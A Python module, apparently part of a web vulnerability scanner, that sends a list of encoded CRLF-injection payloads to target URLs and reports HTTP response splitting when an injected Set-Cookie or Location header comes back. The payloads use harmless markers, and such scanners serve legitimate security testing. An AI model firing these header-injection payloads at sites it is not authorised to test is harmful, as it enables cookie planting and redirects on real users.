from core.others import requester, requests, multitest

RedirectCodes = [i for i in range(300, 311, 1)]
payloads = [
    r"%0d%0aLocation:www.google.com%0d%0a",
    r"%0d%0aSet-Cookie:name=ch33ms;",
    r"\r\n\tSet-Cookie:name=ch33ms;",
    r"\r\tSet-Cookie:name=ch33ms;",
    r"%E5%98%8A%E5%98%8DLocation:www.google.com",
    r"\rSet-Cookie:name=ch33ms;",
    r"\r%20Set-Cookie:name=ch33ms;",
    r"\r\nSet-Cookie:name=ch33ms;",
    r"\r\n%20Set-Cookie:name=ch33ms;",
    r"\rSet-Cookie:name=ch33ms;",
    r"%u000ASet-Cookie:name=ch33ms;",
    r"\r%20Set-Cookie:name=ch33ms;",
    r"%23%0D%0ALocation:www.google.com;",
    r"\r\nSet-Cookie:name=ch33ms;",
    r"\r\n%20Set-Cookie:name=ch33ms;",
    r"\r\n\tSet-Cookie:name=ch33ms;",
    r"\r\tSet-Cookie:name=ch33ms;",
    r"%5cr%5cnLocation:www.google.com",
    r"%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:name=ch33ms;",
    r"\r\n Header-Test:BLATRUC",
    r"\rSet-Cookie:name=ch33ms;",
    r"\r%20Set-Cookie:name=ch33ms;",
    r"\r\nSet-Cookie:name=ch33ms;",
    r"\r\n%20Set-Cookie:name=ch33ms;",
    r"\r\n\tSet-Cookie:name=ch33ms;",
    r"\r\tSet-Cookie:name=ch33ms;"
]


def crlf_scan(url, foxy):
    result = multitest(url, payloads)
    if type(result) is tuple:
        for params in result[0]:
            testing_break = request(url=result[1], foxy=foxy, params=params)
            if testing_break:
                break
    else:
        for url in result:
            testing_break = request(url=url, foxy=foxy)
            if testing_break:
                break


def request(url, foxy, params='', payload_index=0):
    skip = 1
    if foxy:
        try:
            page = requester(url=url, proxy=True, parameters=params)
        except requests.exceptions.Timeout:
            print(f'[Timeout]  {url}')
            return skip
        except requests.exceptions.ConnectionError:
            print("Connection Error")
            return skip
    else:
        try:
            page = requester(url=url, proxy=False, parameters=params)
        except requests.exceptions.Timeout:
            print(f'[Timeout] {url}')
            return skip
        except requests.exceptions.ConnectionError:
            print("Connection Error")
            return skip
        except IndexError:
            payload_index = 0

    function_break = basic_checks(page_var=page, payload=payloads[payload_index], url=page.request.url)

    payload_index += 1
    if function_break:
        return skip


def basic_checks(page_var, payload, url):
    skip = 1
    if ('Location' in payload and page_var.status_code in RedirectCodes and page_var.headers['Location']
            == "www.google.com"):
        print(f"HTTP Response Splitting found: {payload}")
    elif "Set-Cookie" in payload:
        if page_var.status_code != 404:
            try:
                if page_var.headers['Set-Cookie'] == "name=ch33ms;":
                    print(f"HTTP Response Splitting found: {payload}")
            except KeyError:
                return skip

    if page_var.status_code == 404:
        print(f"{url} {page_var.status_code}")

    elif page_var.status_code == 403:
        print(f"{url} {page_var.status_code}")

    elif page_var.status_code == 400:
        print(f"{url} {page_var.status_code}")

    else:
        print(f"{url} {page_var.status_code}")
